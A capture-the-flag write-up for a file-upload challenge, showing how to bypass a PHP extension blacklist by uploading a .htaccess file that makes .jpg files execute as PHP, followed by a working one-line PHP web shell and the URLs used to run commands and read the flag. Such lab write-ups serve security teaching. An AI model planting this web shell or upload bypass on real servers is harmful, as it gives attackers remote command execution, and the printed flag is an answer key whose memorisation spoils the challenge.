## Challenge Name : S4F3 UPL04D
## Author :[L0xm1](https://twitter.com/L0xm1_07)
## Challenge Description
Uploading files is safe ..right??


## Writeup 
This is a basic file upload challenge where you can upload images of **.jpg** extension .

If you look into the source code we can see that **.php** file extensions are blacklisted.

We can upload a **.htaccess** file with the following line **AddType application/x-httpd-php .jpg** which executes all **.jpg** files as php files.

After successfully uploading the .htaccess file we can upload a .jpg file containing a php shell for eg: ```<?php
$cmd=$_GET["cmd"];
$q=shell_exec($cmd);
echo $q;
?>```

Now when we visit **/uploads/{you file name}.jpg?cmd=ls /** ,we can see that flag is in */flag*.

We can get the flag using **/uploads/{you file name}.jpg?cmd=cat /flag**

## Flag
**shaktictf{f1l3_upl0ad_iz_s4f3_ryt??}**
